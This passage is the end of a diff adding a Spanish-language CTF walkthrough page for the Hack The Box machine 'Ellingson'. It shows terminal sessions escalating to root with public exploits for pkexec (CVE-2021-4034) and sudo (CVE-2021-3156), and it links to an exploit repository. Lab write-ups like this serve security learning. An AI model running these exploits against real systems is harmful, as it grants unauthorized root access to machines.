+-rwsr-xr-x 1 root root 22520 Jul 13  2018 </span><span class="err">/usr/bin/pkexec</span><span class="p">  
+</span><span class="ve">hal@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 CVE-2021-4034.py 
+[+] Creating shared library for exploit code.
+[+] Calling execve()
+# whoami
+root
+#</span>
+</code></pre></div></div><br>
+
+<section class="post" id="extra2-root">
+<br><h3 class="post-title">Extra 2 - root</h3><br>
+
+<p class="plain-text">Mirando la version de <code class="language-plaintext highlighter-rouge">sudo</code> encontramos la <code class="language-plaintext highlighter-rouge">1.8.21p2</code>, la cual es un poco antigua, buscando exploits encontramos el <a href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a> que se aprovecha de esto, simplemente copiamos el exploit y al ejecutarlo ganamos una shell como <code class="language-plaintext highlighter-rouge">root</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">hal@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo --version
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+</span><span class="ve">hal@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 exploit_nss.py  
+# whoami
+root
+#</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
